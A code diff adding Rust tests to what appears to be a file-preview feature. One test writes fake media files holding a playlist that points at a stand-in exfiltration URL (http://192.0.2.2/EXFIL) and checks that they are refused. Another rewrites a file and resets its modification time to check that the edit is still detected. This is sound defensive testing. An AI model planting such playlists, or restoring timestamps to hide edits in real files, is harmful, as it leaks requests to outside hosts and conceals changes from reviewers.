@@ -204,3 +204,39 @@ fn only_a_few_cards_stay_up_and_the_oldest_is_taken_down() {
     assert!(remember_in(&mut list, &format!("local:present-file:many{}", KEPT + 2), &offer).is_empty());
     assert_eq!(list.len(), KEPT);
 }
+
+#[test]
+fn sound_and_video_are_not_offered_because_the_player_fetches_what_a_playlist_names() {
+    let (_d, home) = home("media");
+    for name in ["song.mp3", "clip.mp4", "talk.mkv"] {
+        // A "song" that is a playlist pointing at a server: the press would make the request.
+        std::fs::write(home.join("Sites").join(name), "#EXTM3U
+http://192.0.2.2/EXFIL").unwrap();
+        let err = ask(&home, &format!("Sites/{name}")).expect_err(name);
+        assert!(err.contains("does not offer sound or video"), "{name}: {err}");
+    }
+}
+
+#[test]
+fn presentation_cards_never_fill_every_visible_toast_slot() {
+    // `wire::toast` shows three at once; a Mind may hold fewer of them.
+    assert!(KEPT < 3, "KEPT is {KEPT}");
+}
+
+#[test]
+fn a_rewrite_that_restores_the_modification_time_is_still_a_change() {
+    use std::os::unix::fs::MetadataExt;
+    let (_d, home) = home("ctime");
+    std::fs::write(home.join("Sites/c.html"), "aaaa").unwrap();
+    let offer = ask(&home, "Sites/c.html").unwrap();
+    remember("local:present-file:ctime", &offer);
+    std::thread::sleep(std::time::Duration::from_millis(30));
+    let before = std::fs::metadata(home.join("Sites/c.html")).unwrap();
+    // The same size, the time put back: only the change time shows it.
+    std::fs::write(home.join("Sites/c.html"), "bbbb").unwrap();
+    let file = std::fs::OpenOptions::new().write(true).open(home.join("Sites/c.html")).unwrap();
+    file.set_modified(std::time::UNIX_EPOCH + std::time::Duration::new(before.mtime() as u64, before.mtime_nsec() as u32)).unwrap();
+    drop(file);
+    let err = what_a_press_opens("local:present-file:ctime").unwrap_err();
+    assert!(err.contains("nothing was opened"), "{err}");
+}
